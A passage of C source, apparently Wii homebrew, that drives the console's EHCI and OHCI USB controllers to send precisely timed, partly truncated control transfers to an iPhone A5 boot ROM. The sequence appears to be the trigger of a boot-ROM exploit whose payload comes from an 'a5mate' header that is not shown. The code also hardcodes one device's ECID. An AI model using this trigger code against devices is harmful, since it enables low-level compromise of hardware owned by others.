#include "packet_probe.h"
#include <ogc/ipc.h>
#include <ogc/lwp_watchdog.h>
#include <string.h>

/* a5mate supplies the payload and geometry selected by the Makefile. */
#if !defined(A5_8940) && !defined(A5_8942) && !defined(A5_8945)
#error "Select an A5 profile with A5WII_A5_PROFILE"
#endif
#define PROGMEM
#include "a5mate_constants.h"
#undef PROGMEM
#define CMD 0xcd040010U
#define STS 0xcd040014U
#define IRQ 0xcd040018U
#define FRINDEX 0xcd04001cU
#define ASYNC 0xcd040028U
#define ASE 0x20U
#define IAAD 0x40U
#define ASS 0x8000U
#define IAA 0x20U
#define HALT 0x1000U
#define PSE 0x10U
static void delay_us(u32 micros);

typedef struct {
    u32 qh[32], qtd[24];
    u8 bytes[128], setup[32];
} packet_dma;
static s32 heap=-1;
static u32 rd(u32 p) {u32 x=*(volatile u32*)p; __asm__ volatile("eieio" ::: "memory");return x;}
static void wr(u32 p,u32 x) {*(volatile u32*)p=x;__asm__ volatile("eieio; sync" ::: "memory");}
static u32 le(u32 x) {return __builtin_bswap32(x);}
static u32 physical(const void *p) {return (u32)p&0x3fffffff;}
static int wait_bits(u32 reg,u32 mask,u32 expected,u32 micros) {
    u64 start=gettime();
    do {if((rd(reg)&mask)==expected)return 1;}
    while(ticks_to_microsecs(gettime()-start)<micros);
    return 0;
}

// Caller holds the controller stopped, with IOS interrupts masked. No IPC
// calls, allocations or network reporting are allowed until it is restored.
static int packet_timed(packet_dma *w,u8 address,u8 pid,u8 toggle,const u8 *bytes,u16 size,
                        u32 command,u32 timeout_us,packet_stage *out) {
    memset(out,0,sizeof(*out));out->pid=pid;out->toggle=toggle;out->requested=size;
    if(!(rd(STS)&HALT) || size>64 || pid>2 || toggle>1){out->result=-10;return -10;}
    memset(w,0,sizeof(*w));
    memset(w->bytes,0xff,sizeof(w->bytes));
    if(bytes && size)memcpy(w->bytes,bytes,size);
    w->qh[0]=le(physical(w->qh)|2);
    w->qh[1]=le(address|(2U<<12)|(1U<<14)|(1U<<15)|(64U<<16)|(15U<<28));
    w->qh[2]=le(1U<<30);
    w->qh[4]=le(physical(w->qtd));w->qh[5]=le(1);
    w->qtd[0]=le(1);w->qtd[1]=le(1);
    out->before=((u32)toggle<<31)|((u32)size<<16)|(3U<<10)|((u32)pid<<8)|0x80;
    w->qtd[2]=le(out->before);
    w->qtd[3]=le(physical(w->bytes));
    for(unsigned j=1;j<5;j++)w->qtd[3+j]=le((physical(w->bytes)&~4095U)+4096*j);
    DCFlushRange(w,sizeof(*w));
    volatile packet_dma *uncached=(volatile packet_dma*)((u32)w|0x40000000);
    wr(ASYNC,physical(w->qh));wr(CMD,command|ASE|1);
    out->result=-5;
    u64 start=gettime();
    do {
        u32 token=le(uncached->qtd[2]);
        if(token&0x7c){out->result=-6;break;}
        if(!(token&0x80)){out->result=((token>>16)&0x7fff)?-11:0;break;}
    }while(ticks_to_microsecs(gettime()-start)<timeout_us);
    wr(CMD,command&~(ASE|1U));
    if(!wait_bits(STS,HALT,HALT,10000)){out->result=-7;return -7;}
    out->after=le(uncached->qtd[2]);
    for(unsigned i=0;i<64;i++)out->bytes[i]=uncached->bytes[i];
    // Subsequent CPU writes must not reuse the stale cached DMA overlay.
    DCInvalidateRange(w,sizeof(*w));
    return out->result;
}

/* Normal Wii diagnostics retain their more forgiving 20 ms packet limit. */
static int packet(packet_dma *w,u8 address,u8 pid,u8 toggle,const u8 *bytes,u16 size,
                  u32 command,packet_stage *out) {
    return packet_timed(w,address,pid,toggle,bytes,size,command,20000,out);
}

void packet_read_transaction(u8 address,u8 serial_index,int early_status,packet_transaction *out) {
    memset(out,0,sizeof(*out));out->result=-1;
    if(!address || address>127 || !serial_index || rd(0xcd800064)!=0xffffffff ||
       rd(0xcd040000)!=0x01000010)return;
    if(heap<0)heap=iosCreateHeap(2048);
    if(heap<0){out->result=-2;return;}
    packet_dma *w=iosAlloc(heap,sizeof(*w));
    if(!w){out->result=-2;return;}
    u32 command=rd(CMD), irq=rd(IRQ), async=rd(ASYNC), status=rd(STS);
    out->saved_command=command;out->saved_async=async;
    if(!(command&1) || !(command&ASE) || !(status&ASS)){iosFree(heap,w);out->result=-3;return;}
    wr(IRQ,0);wr(CMD,command&~(ASE|1U));
    if(!wait_bits(STS,HALT,HALT,10000)) {
        wr(CMD,command);wr(IRQ,irq);iosFree(heap,w);out->result=-4;return;
    }
    const u8 setup[8]={0x80,6,serial_index,3,9,4,128,0};
    out->result=packet(w,address,2,0,setup,8,command,&out->stage[out->count++]);
    if(out->result==0)out->result=packet(w,address,1,1,NULL,64,command,&out->stage[out->count++]);
    if(out->result==0 && !early_status)
        out->result=packet(w,address,1,0,NULL,64,command,&out->stage[out->count++]);
    if(out->result==0)out->result=packet(w,address,0,1,NULL,0,command,&out->stage[out->count++]);
    // Diagnostic recovery: check whether the early status left the second
    // serial packet pending. Keep IOS out of the schedule until it is drained.
    if(out->result==0 && early_status==2)
        out->result=packet(w,address,1,0,NULL,64,command,&out->stage[out->count++]);
    // Try to halt a second time if needed; never free DMA still owned by EHCI.
    wr(CMD,command&~(ASE|1U));
    if(!wait_bits(STS,HALT,HALT,10000)){out->result=-7;return;}
    wr(STS,(rd(STS)&3)&~status);
    wr(ASYNC,async);wr(CMD,command);wr(IRQ,irq);
    out->restored_command=rd(CMD);out->restored_async=rd(ASYNC);
    out->restored=wait_bits(STS,ASS,ASS,10000) && rd(CMD)==command && rd(ASYNC)==async;
    if(!out->restored)out->result=-9;
    iosFree(heap,w);
}

// Let the target service SETUP before scheduling DATA and STATUS together.
// All stages remain under our ownership, including the running bus delay.
static int control(packet_dma *w,u8 address,const u8 setup[8],u16 read_size,
                   u32 command,packet_stage *stages) {
    int padded_status=read_size && !(setup[0]&0x80) && !setup[6] && !setup[7];
    unsigned count=read_size && !padded_status?3:2;
    if(!(rd(STS)&HALT) || read_size>128)return -10;
    memset(stages,0,count*sizeof(*stages));
    int setup_result=packet(w,address,2,0,setup,8,command,&stages[0]);
    if(setup_result)return setup_result;
    wr(CMD,(command&~(ASE|PSE))|1);delay_us(10000);
    wr(CMD,command&~(ASE|PSE|1U));
    if(!wait_bits(STS,HALT,HALT,10000))return -7;
    memset(w,0,sizeof(*w));
    memcpy(w->setup,setup,8);memset(w->bytes,0xff,sizeof(w->bytes));
    w->qh[0]=le(physical(w->qh)|2);
    w->qh[1]=le(address|(2U<<12)|(1U<<14)|(1U<<15)|(64U<<16)|(15U<<28));
    w->qh[2]=le(1U<<30);w->qh[4]=le(physical(w->qtd+8));w->qh[5]=le(1);
    if(read_size) {
        stages[1].pid=1;stages[1].toggle=1;stages[1].requested=read_size;
        stages[1].before=0x80000d80|((u32)read_size<<16);
    }
    if(!padded_status) {
        stages[count-1].pid=read_size?0:1;stages[count-1].toggle=1;
        stages[count-1].before=read_size?0x80000c80:0x80000d80;
    }
    for(unsigned i=1;i<count;i++) {
        u32 *td=w->qtd+8*i;
        td[0]=le(i+1<count?physical(td+8):1);
        td[1]=le(count==3 && i==1?physical(w->qtd+16):1);
        td[2]=le(stages[i].before);
        u32 buffer=i==0?physical(w->setup):physical(w->bytes);
        td[3]=le(buffer);
        for(unsigned j=1;j<5;j++)td[3+j]=le((buffer&~4095U)+4096*j);
    }
    DCFlushRange(w,sizeof(*w));
    volatile packet_dma *u=(volatile packet_dma*)((u32)w|0x40000000);
    wr(ASYNC,physical(w->qh));wr(CMD,command|ASE|1);
    int result=-5;u64 start=gettime();
    do {
        u32 errors=0;
        for(unsigned i=1;i<count;i++)errors|=le(u->qtd[8*i+2])&0x7c;
        if(errors){result=-6;break;}
        if(!(le(u->qtd[8*(count-1)+2])&0x80)){result=0;break;}
    }while(ticks_to_microsecs(gettime()-start)<20000);
    if(!result && count==2) {
        start=gettime();
        while(ticks_to_microsecs(gettime()-start)<2000){}
    }
    wr(CMD,command&~(ASE|1U));
    if(!wait_bits(STS,HALT,HALT,10000))return -7;
    for(unsigned i=1;i<count;i++) {
        stages[i].after=le(u->qtd[8*i+2]);
        stages[i].result=(stages[i].after&0x7c)?-6:(stages[i].after&0x80)?-5:0;
    }
    if(read_size)for(unsigned i=0;i<read_size;i++)stages[1].bytes[i]=u->bytes[i];
    DCInvalidateRange(w,sizeof(*w));
    return result;
}

#define PORT_BASE 0xcd040054U
#define PORT_CHANGE 0x2aU
#define PORT_RESET 0x100U
#define PORT_ENABLE 0x4U
#define PORT_SUSPEND 0x80U
#define PORT_RESUME 0x40U
#define PORT_OWNER 0x2000U
#define EHCI_CONFIGFLAG 0xcd040050U
#define EHCI_CHICKENBITS 0xcd0400ccU
#define EHCI_OHCI0_GATE (0x000e0000U|(1U<<11))

/* OHCI0 is the companion for the two external USB ports on this Wii.  Its
 * register interface has the same native-endian access convention as the
 * working EHCI path, while its descriptors are little-endian in memory. */
#define OHCI0 0xcd050000U
#define OHCI_CONTROL 0x04U
#define OHCI_COMMAND 0x08U
#define OHCI_INT_STATUS 0x0cU
#define OHCI_INT_ENABLE 0x10U
#define OHCI_INT_DISABLE 0x14U
#define OHCI_HCCA 0x18U
#define OHCI_CONTROL_HEAD 0x20U
#define OHCI_CONTROL_CURRENT 0x24U
#define OHCI_BULK_HEAD 0x28U
#define OHCI_BULK_CURRENT 0x2cU
#define OHCI_FM_INTERVAL 0x34U
#define OHCI_PERIODIC_START 0x40U
#define OHCI_ROOT_A 0x48U
#define OHCI_ROOT_STATUS 0x50U
#define OHCI_ROOT_PORT1 0x54U
#define OHCI_CBSR 0x3U
#define OHCI_CLE 0x10U
#define OHCI_OPER 0x80U
#define OHCI_RWC 0x200U
#define OHCI_HCR 0x1U
#define OHCI_CLF 0x2U
#define OHCI_FIT 0x80000000U
#define OHCI_RH_CCS 0x1U
#define OHCI_RH_PES 0x2U
#define OHCI_RH_PRS 0x10U
#define OHCI_RH_LSDA 0x200U
#define OHCI_RH_CSC 0x00010000U
#define OHCI_RH_PRSC 0x00100000U
#define OHCI_TD_CC_NOT_ACCESSED 0xf0000000U
#define OHCI_TD_DI_6 (6U<<21)
#define OHCI_TD_DATA0 0x02000000U
#define OHCI_TD_DATA1 0x03000000U
#define OHCI_TD_IN 0x00100000U
#define OHCI_TD_OUT 0x00080000U
#define OHCI_TD_ROUND 0x00040000U
#define OHCI_REPLUG_TIMEOUT_US 180000000U

typedef struct {
    u32 hcca[64];
    u32 ed[4];
    u32 td[4][4];
    u8 setup[8],data[64];
} ohci_probe_dma;
/* IOS allocations live in MEM2.  EHCI can DMA there, but the Hollywood
 * OHCI companion's USB transmit path follows the original Wii driver and
 * needs its control workspace in low MEM1.  Static BSS is loaded in MEM1. */
static ohci_probe_dma fullspeed_work ATTRIBUTE_ALIGN(256);

static void delay_us(u32 micros) {
    u64 start=gettime();
    while(ticks_to_microsecs(gettime()-start)<micros){}
}

int packet_fullspeed_probe(u8 address,int require_replug,fullspeed_probe_result *out) {
    ohci_probe_dma *work=&fullspeed_work;
    u32 ehci_command=0,ehci_irq=0,ehci_async=0,ehci_status=0;
    u32 ohci_control=0,ohci_int_enable=0,ohci_hcca=0,ohci_head=0,ohci_current=0;
    u32 ohci_bulk_head=0,ohci_bulk_current=0,ohci_fm_interval=0,ohci_periodic_start=0;
    int ehci_stopped=0,ohci_taken=0,ehci_was_running=0,ehci_resumed=0;

    memset(out,0,sizeof(*out));out->result=-1;out->port=-1;
    if(!address || address>127 || rd(0xcd800064)!=0xffffffff ||
       rd(0xcd040000)!=0x01000010)return out->result;
    out->dma_physical=physical(work);

    ehci_command=rd(CMD);ehci_irq=rd(IRQ);ehci_async=rd(ASYNC);ehci_status=rd(STS);
    ehci_was_running=(ehci_command&1U) && (ehci_command&ASE) && (ehci_status&ASS);
    if(!ehci_was_running && !(ehci_status&HALT)) {
        out->result=-3;goto restore;
    }
    unsigned connected=0,ehci_port=0;
    for(unsigned port=0;port<(rd(0xcd040004)&15U);port++) {
        u32 value=rd(PORT_BASE+4*port);
        if(value&1U){connected++;ehci_port=port;out->ehci_port_before=value;}
    }
    /* The target must presently be the sole high-speed device selected by
     * the caller.  We never repurpose a port already owned by a companion. */
    if(connected!=1 || ehci_port>1 || (out->ehci_port_before&0x3105U)!=0x1005U) {
        out->result=-20;goto restore;
    }
    out->ehci_config_before=rd(EHCI_CONFIGFLAG);
    out->ohci_gate_before=rd(EHCI_CHICKENBITS);
    ohci_control=rd(OHCI0+OHCI_CONTROL);
    ohci_int_enable=rd(OHCI0+OHCI_INT_ENABLE);
    ohci_hcca=rd(OHCI0+OHCI_HCCA);
    ohci_head=rd(OHCI0+OHCI_CONTROL_HEAD);
    ohci_current=rd(OHCI0+OHCI_CONTROL_CURRENT);
    ohci_bulk_head=rd(OHCI0+OHCI_BULK_HEAD);
    ohci_bulk_current=rd(OHCI0+OHCI_BULK_CURRENT);
    ohci_fm_interval=rd(OHCI0+OHCI_FM_INTERVAL);
    ohci_periodic_start=rd(OHCI0+OHCI_PERIODIC_START);
    u32 selected_port=PORT_BASE+4*ehci_port;

    /* Freeze IOS58's high-speed schedule before handing the selected port to
     * its companion.  CF=0 is the global route; PO makes the per-port handoff
     * explicit on controllers that retain high-speed ownership until asked. */
    if(ehci_was_running || (rd(selected_port)&PORT_SUSPEND)) {
        wr(IRQ,0);
        /* IOS58 leaves the idle DFU port suspended (bit 7 in PORTSC).  A
         * companion handoff must first complete the EHCI resume handshake;
         * otherwise OHCI sees attach/reset but its first token gets no ACK. */
        if(rd(selected_port)&PORT_SUSPEND) {
            wr(CMD,(ehci_command&~(ASE|PSE))|1U);
            wr(selected_port,(rd(selected_port)&~PORT_CHANGE)|PORT_RESUME);
            delay_us(20000);
            wr(selected_port,rd(selected_port)&~(PORT_CHANGE|PORT_RESUME));
            if(!wait_bits(selected_port,PORT_RESUME|PORT_SUSPEND,0,10000)) {
                out->result=-32;goto restore;
            }
            ehci_resumed=1;
        }
    }
    if(ehci_was_running || ehci_resumed) {
        wr(CMD,ehci_command&~(ASE|PSE|1U));
        if(!wait_bits(STS,HALT,HALT,10000)){out->result=-4;goto restore;}
    }
    ehci_stopped=1;
    wr(OHCI0+OHCI_INT_DISABLE,~0U);
    wr(OHCI0+OHCI_CONTROL,ohci_control&~(OHCI_CLE|0x2cU));
    delay_us(10000);
    /* Reinitialize the companion exactly as the native Wii OHCI driver
     * does.  IOS58 has never needed OHCI0's control list in this session;
     * merely replacing its HCCA leaves Hollywood's control scheduler in a
     * state where it emits a SETUP but obtains no ACK. */
    ohci_taken=1;
    wr(OHCI0+OHCI_COMMAND,OHCI_HCR);
    if(!wait_bits(OHCI0+OHCI_COMMAND,OHCI_HCR,0,1000)) {
        out->result=-31;goto restore;
    }
    u32 fi=rd(OHCI0+OHCI_FM_INTERVAL)&0x3fffU;
    if(fi<210U)fi=0x2edfU;
    u32 fm_interval=fi|((((6U*(fi-210U))/7U)&0x7fffU)<<16)|
                    ((rd(OHCI0+OHCI_FM_INTERVAL)^OHCI_FIT)&OHCI_FIT);
    wr(OHCI0+OHCI_CONTROL_HEAD,0);wr(OHCI0+OHCI_CONTROL_CURRENT,0);
    wr(OHCI0+OHCI_BULK_HEAD,0);wr(OHCI0+OHCI_BULK_CURRENT,0);
    memset(work,0,sizeof(*work));
    DCFlushRange(work,sizeof(*work));
    wr(OHCI0+OHCI_HCCA,physical(work->hcca));
    wr(OHCI0+OHCI_FM_INTERVAL,fm_interval);
    wr(OHCI0+OHCI_PERIODIC_START,((9U*fi)/10U)&0x3fffU);
    wr(OHCI0+OHCI_CONTROL,OHCI_CBSR|OHCI_OPER);
    wr(OHCI0+OHCI_ROOT_STATUS,OHCI_RH_CSC);
    /* Hollywood keeps the companion's bus path behind an EHCI-side gate.
     * The native Wii OHCI driver enables this 0xe0000/oh0 mask before it
     * enumerates a device; retain and restore IOS58's original value. */
    wr(EHCI_CHICKENBITS,out->ohci_gate_before|EHCI_OHCI0_GATE);
    out->ohci_gate_during=rd(EHCI_CHICKENBITS);
    /* EHCI refuses a real companion handoff while the port is enabled.  The
     * PORT_OWNER status bit can still appear set after a one-shot write, but
     * the HS PHY continues to own the wires and OHCI then gets only
     * DeviceNotResponding.  Use the standard disable-and-toggle sequence;
     * some controllers require its second pass to latch ownership. */
    wr(EHCI_CONFIGFLAG,0);
    out->ehci_config_during=rd(EHCI_CONFIGFLAG);
    for(unsigned attempt=0;attempt<4;attempt++) {
        u32 value=rd(selected_port);
        if(value&PORT_OWNER)break;
        value^=PORT_OWNER;
        value&=~(PORT_ENABLE|PORT_CHANGE);
        wr(selected_port,value);
        delay_us(5000);
    }
    if(!wait_bits(selected_port,PORT_OWNER,PORT_OWNER,10000)) {
        out->result=-27;goto restore;
    }
    out->ehci_port_during=rd(selected_port);
    delay_us(50000);

    unsigned ports=rd(OHCI0+OHCI_ROOT_A)&0xffU;
    if(!ports || ports>2){out->result=-21;goto restore;}
    for(unsigned port=0;port<ports;port++) {
        u32 value=rd(OHCI0+OHCI_ROOT_PORT1+4*port);
        if(value&OHCI_RH_CCS){out->port=port;out->ohci_port_before=value;break;}
    }
    if(out->port<0 && !require_replug){out->result=-22;goto restore;}
    if(require_replug) {
        /* A high-speed device can retain its negotiated PHY state through a
         * logical companion handoff.  Wait for a real unplug and reconnect
         * so the fresh attach is negotiated entirely by OHCI0. */
        u64 start=gettime();
        if(out->port>=0) {
            u32 initial_port=(unsigned)out->port;
            while(rd(OHCI0+OHCI_ROOT_PORT1+4*initial_port)&OHCI_RH_CCS) {
                if(ticks_to_microsecs(gettime()-start)>=OHCI_REPLUG_TIMEOUT_US) {
                    out->result=-28;goto restore;
                }
                delay_us(10000);
            }
        }
        start=gettime();out->port=-1;
        do {
            for(unsigned port=0;port<ports;port++) {
                u32 value=rd(OHCI0+OHCI_ROOT_PORT1+4*port);
                if(value&OHCI_RH_CCS) {
                    out->port=port;out->ohci_port_before=value;break;
                }
            }
            if(out->port>=0)break;
            delay_us(10000);
        }while(ticks_to_microsecs(gettime()-start)<OHCI_REPLUG_TIMEOUT_US);
        if(out->port<0){out->result=-29;goto restore;}
        out->replug_seen=1;
        delay_us(100000);
    }
    u32 root_port=OHCI0+OHCI_ROOT_PORT1+4*(unsigned)out->port;
    /* Match the Hollywood OHCI bring-up sequence used by the native Wii
     * driver: acknowledge attach, allow the PHY to settle, explicitly enable
     * the port, then request reset.  Reset-first produces an enabled port on
     * this hardware but its first control SETUP is not driven reliably. */
    wr(root_port,OHCI_RH_CSC|OHCI_RH_PRSC);
    delay_us(120000);
    wr(root_port,OHCI_RH_PES);
    if(!wait_bits(root_port,OHCI_RH_PES,OHCI_RH_PES,10000)) {
        out->result=-30;goto restore;
    }
    wr(root_port,OHCI_RH_PRS);
    delay_us(50000);
    if(!wait_bits(root_port,OHCI_RH_PRSC,OHCI_RH_PRSC,10000)){out->result=-23;goto restore;}
    /* a5mate's MAX3421E state machine deliberately waits through the
     * device-recovery interval after reset before it sends its first SETUP.
     * The iPhone boot ROM is less forgiving than ordinary USB peripherals;
     * retain a conservative 500 ms idle window here. */
    delay_us(500000);
    out->ohci_port_after=rd(root_port);
    if((out->ohci_port_after&(OHCI_RH_CCS|OHCI_RH_PES))!=(OHCI_RH_CCS|OHCI_RH_PES) ||
       (out->ohci_port_after&OHCI_RH_LSDA)){out->result=-24;goto restore;}

    static const u8 descriptor_setup[8]={0x80,6,0,1,0,0,18,0};
    memcpy(work->setup,descriptor_setup,sizeof(descriptor_setup));
    /* One ED, three active TDs and one terminating dummy TD.  Explicit
     * toggles make this a literal SETUP/DATA1/STATUS-DATA1 transaction. */
    work->ed[0]=le(64U<<16);
    work->ed[1]=le(physical(work->td[3]));
    work->ed[2]=le(physical(work->td[0]));
    work->ed[3]=le(0);
    work->td[0][0]=le(OHCI_TD_CC_NOT_ACCESSED|OHCI_TD_DI_6|OHCI_TD_DATA0);
    work->td[0][1]=le(physical(work->setup));
    work->td[0][2]=le(physical(work->td[1]));
    work->td[0][3]=le(physical(work->setup)+sizeof(work->setup)-1);
    work->td[1][0]=le(OHCI_TD_CC_NOT_ACCESSED|OHCI_TD_DI_6|OHCI_TD_DATA1|OHCI_TD_IN|OHCI_TD_ROUND);
    work->td[1][1]=le(physical(work->data));
    work->td[1][2]=le(physical(work->td[2]));
    work->td[1][3]=le(physical(work->data)+17);
    work->td[2][0]=le(OHCI_TD_CC_NOT_ACCESSED|OHCI_TD_DATA1|OHCI_TD_OUT);
    work->td[2][1]=le(0);work->td[2][2]=le(physical(work->td[3]));work->td[2][3]=le(0);
    work->td[3][0]=le(OHCI_TD_CC_NOT_ACCESSED);
    DCFlushRange(work,sizeof(*work));
    volatile ohci_probe_dma *uncached=(volatile ohci_probe_dma*)((u32)work|0x40000000U);
    /* Hollywood's OHCI requires an approximately 11 ms quiet interval before
     * a new control-list head is published.  This is the documented Wii
     * OHCI control-transfer quirk; without it the first SETUP is retried and
     * retired as DeviceNotResponding even after a fresh physical attach. */
    delay_us(11000);
    wr(OHCI0+OHCI_CONTROL_HEAD,physical(work->ed));
    wr(OHCI0+OHCI_CONTROL_CURRENT,0);
    wr(OHCI0+OHCI_CONTROL,OHCI_CBSR|OHCI_OPER|OHCI_CLE);
    wr(OHCI0+OHCI_COMMAND,OHCI_CLF);
    u64 start=gettime();
    do {
        out->status_info=le(uncached->td[2][0]);
        if((out->status_info&0xf0000000U)!=OHCI_TD_CC_NOT_ACCESSED)break;
    }while(ticks_to_microsecs(gettime()-start)<20000);
    out->setup_info=le(uncached->td[0][0]);
    out->data_info=le(uncached->td[1][0]);
    out->status_info=le(uncached->td[2][0]);
    for(unsigned i=0;i<sizeof(out->descriptor);i++)out->descriptor[i]=uncached->data[i];
    if((out->setup_info&0xf0000000U)!=0 || (out->data_info&0xf0000000U)!=0 ||
       (out->status_info&0xf0000000U)!=0){out->result=-25;goto restore;}
    out->result=0;

restore:
    if(ohci_taken) {
        /* No descriptor is freed until the control list has been stopped for
         * several full-speed frames. */
        wr(OHCI0+OHCI_CONTROL,(ohci_control&(OHCI_CBSR|OHCI_RWC))|OHCI_OPER);
        delay_us(10000);
    }
    if(ehci_stopped) {
        wr(EHCI_CONFIGFLAG,out->ehci_config_before);
        wr(EHCI_CHICKENBITS,out->ohci_gate_before);
        /* IOS58 originally owned this high-speed port; clear the explicit
         * companion-owner bit before returning its schedule. */
        wr(PORT_BASE+4*ehci_port,(rd(PORT_BASE+4*ehci_port)&~(PORT_CHANGE|PORT_OWNER)));
    }
    if(ohci_taken) {
        wr(OHCI0+OHCI_INT_DISABLE,~0U);
        wr(OHCI0+OHCI_CONTROL_HEAD,ohci_head);
        wr(OHCI0+OHCI_CONTROL_CURRENT,ohci_current);
        wr(OHCI0+OHCI_BULK_HEAD,ohci_bulk_head);
        wr(OHCI0+OHCI_BULK_CURRENT,ohci_bulk_current);
        wr(OHCI0+OHCI_HCCA,ohci_hcca);
        wr(OHCI0+OHCI_FM_INTERVAL,ohci_fm_interval);
        wr(OHCI0+OHCI_PERIODIC_START,ohci_periodic_start);
        wr(OHCI0+OHCI_CONTROL,ohci_control);
        wr(OHCI0+OHCI_INT_STATUS,~0U);
        wr(OHCI0+OHCI_INT_ENABLE,ohci_int_enable);
    }
    if(ehci_stopped) {
        wr(STS,(rd(STS)&7U)&~ehci_status);
        wr(ASYNC,ehci_async);wr(CMD,ehci_command);wr(IRQ,ehci_irq);
        out->restored=(ehci_was_running?wait_bits(STS,ASS,ASS,10000):wait_bits(STS,HALT,HALT,10000)) && rd(CMD)==ehci_command &&
                      rd(ASYNC)==ehci_async && rd(EHCI_CONFIGFLAG)==out->ehci_config_before;
        if(!out->restored && !out->result)out->result=-26;
    }
    return out->result;
}

static void reset_target(u8 address,int recovery_mode,packet_transaction *prefix,
                         u8 serial_index,int early_status,packet_reset *out) {
    memset(out,0,sizeof(*out));out->result=-1;out->port=-1;
    if(prefix){memset(prefix,0,sizeof(*prefix));prefix->result=-1;if(!serial_index)return;}
    if(!address || address>127 || rd(0xcd800064)!=0xffffffff ||
       rd(0xcd040000)!=0x01000010)return;
    unsigned ports=rd(0xcd040004)&15, connected=0;
    if(ports!=4)return;
    for(unsigned p=0;p<ports;p++)if(rd(PORT_BASE+4*p)&1){connected++;out->port=p;}
    if(connected!=1){out->result=-20;return;}
    u32 port=PORT_BASE+4*out->port;
    out->before=rd(port);
    // Require a powered, enabled high-speed port owned by EHCI.
    if((out->before&0x3105)!=0x1005){out->result=-21;return;}
    if(heap<0)heap=iosCreateHeap(2048);
    packet_dma *w=heap<0?NULL:iosAlloc(heap,sizeof(*w));
    if(!w){out->result=-2;return;}
    u32 command=rd(CMD),irq=rd(IRQ),async=rd(ASYNC),status=rd(STS);
    out->saved_command=command;out->saved_async=async;
    if(!(command&1) || !(command&ASE) || !(status&ASS)){out->result=-3;iosFree(heap,w);return;}
    wr(IRQ,0);wr(CMD,command&~(ASE|PSE|1U));
    if(!wait_bits(STS,HALT,HALT,10000)){out->result=-4;goto restore;}
    if(prefix) {
        const u8 partial[8]={0x80,6,serial_index,3,9,4,128,0};
        prefix->saved_command=command;prefix->saved_async=async;
        prefix->result=packet(w,address,2,0,partial,8,command&~PSE,&prefix->stage[prefix->count++]);
        if(!prefix->result)prefix->result=packet(w,address,1,1,NULL,64,command&~PSE,&prefix->stage[prefix->count++]);
        // A normal DFU reset must not leave a control response queued on EP0.
        // Finish the requested 128-byte read before resetting the port.
        if(!prefix->result && recovery_mode==4)
            prefix->result=packet(w,address,1,0,NULL,64,command&~PSE,&prefix->stage[prefix->count++]);
        if(!prefix->result && (early_status || recovery_mode==4))
            prefix->result=packet(w,address,0,1,NULL,0,command&~PSE,&prefix->stage[prefix->count++]);
        out->interrupted_status=rd(STS);out->interrupted_irq=rd(IRQ);
        if(prefix->result){out->result=prefix->result;goto restore;}
        if(recovery_mode==4)recovery_mode=0;
    }
    // Run the bus clock with both schedules disabled. No IOS/IPC calls here.
    wr(CMD,(command&~(ASE|PSE))|1);
    if(rd(port)&PORT_SUSPEND) {
        wr(port,(rd(port)&~PORT_CHANGE)|PORT_RESUME);
        delay_us(20000);
        wr(port,rd(port)&~(PORT_CHANGE|PORT_RESUME));
        if(!wait_bits(port,PORT_RESUME|PORT_SUSPEND,0,10000)){out->result=-22;goto restore;}
    }
    wr(port,(rd(port)&~(PORT_CHANGE|4U))|PORT_RESET);
    out->asserted=rd(port);
    u64 start=gettime();delay_us(1000);
    out->during_1ms=rd(port);out->during_command=rd(CMD);out->during_status=rd(STS);
    delay_us(49000);
    out->during_50ms=rd(port);
    out->hold_us=ticks_to_microsecs(gettime()-start);
    wr(port,rd(port)&~(PORT_CHANGE|PORT_RESET));
    if(!wait_bits(port,PORT_RESET,0,10000)){out->result=-23;goto restore;}
    delay_us(recovery_mode==3?100000:10000);
    out->after=rd(port);
    if((out->after&0x3105)!=0x1005){out->result=-24;goto restore;}
    wr(CMD,command&~(ASE|PSE|1U));
    if(!wait_bits(STS,HALT,HALT,10000)){out->result=-7;goto restore;}
    const u8 descriptor[8]={0x80,6,0,1,0,0,18,0};
    static const u8 expected[18]={18,1,0,2,0,0,0,64,0xac,5,0x27,0x12,0,0,1,2,3,1};
    if(recovery_mode==3) {
        // SET_ADDRESS(0) has no DATA stage. Permit the stale 64-byte packet
        // followed by its actual zero-length IN status, without queuing a
        // fresh descriptor behind the old response.
        const u8 address_zero[8]={0,5,0,0,0,0,0,0};
        for(unsigned pass=0;pass<4;pass++) {
        unsigned flush=out->count;out->count+=2;
        out->result=control(w,0,address_zero,128,command&~PSE,&out->stage[flush]);
        if(out->result)goto restore;
        packet_stage *status_packet=&out->stage[flush+1];
        unsigned remaining=(status_packet->after>>16)&0x7fff;
        if(remaining!=128 && remaining!=64){out->result=-25;goto restore;}
        if(remaining==64) {
            static const char tail[]="01 BDID:08 ECID:00000024C0036D8F";
            for(unsigned j=0;j<32;j++)if(status_packet->bytes[2*j]!=(u8)tail[j] || status_packet->bytes[2*j+1]) {
                out->result=-25;goto restore;
            }
        }
        }
        // A5 can retain an IN packet across bus reset. Receive a full EP0
        // max-packet first: an 18-byte qTD instead produces babble on that
        // stale 64-byte response. Preserve every stage, complete its status,
        // and allow at most three complete descriptor reads.
        for(unsigned attempt=0;attempt<3;attempt++) {
            u16 requested=64;
            const u8 wide_descriptor[8]={0x80,6,0,1,0,0,(u8)requested,0};
            unsigned first=out->count;out->count+=3;
            out->result=control(w,0,wide_descriptor,requested,command&~PSE,&out->stage[first]);
            if(out->result)goto restore;
            packet_stage *data=&out->stage[first+1];
            if(((data->after>>16)&0x7fff)==requested-18 && !memcmp(data->bytes,expected,18))
                goto restore_address;
        }
        out->result=-25;goto restore;
    }
    if(recovery_mode==2) {
        out->result=packet(w,0,1,0,NULL,64,command&~PSE,&out->stage[out->count++]);
        if(out->result)goto restore;
    }
    out->result=packet(w,0,2,0,descriptor,8,command&~PSE,&out->stage[out->count++]);
    unsigned descriptor_stage=out->count;
    if(!out->result)out->result=packet(w,0,1,1,NULL,18,command&~PSE,&out->stage[out->count++]);
    if(recovery_mode==1 && out->count==2 && out->result==-6 &&
       (out->stage[1].after&0xfc)==0x50) {
        // The failed IN may have consumed an old serial packet. Try one new
        // SETUP while the controller is still exclusively using our schedule.
        out->result=packet(w,0,2,0,descriptor,8,command&~PSE,&out->stage[out->count++]);
        descriptor_stage=out->count;
        if(!out->result)out->result=packet(w,0,1,1,NULL,18,command&~PSE,&out->stage[out->count++]);
    }
    if(!out->result)out->result=packet(w,0,0,1,NULL,0,command&~PSE,&out->stage[out->count++]);
    if(!out->result && memcmp(out->stage[descriptor_stage].bytes,expected,18))out->result=-25;
restore_address:
    if(!out->result) {
        unsigned first=out->count;out->count+=2;
        const u8 assign[8]={0,5,address,0,0,0,0,0};
        out->result=control(w,0,assign,0,command&~PSE,&out->stage[first]);
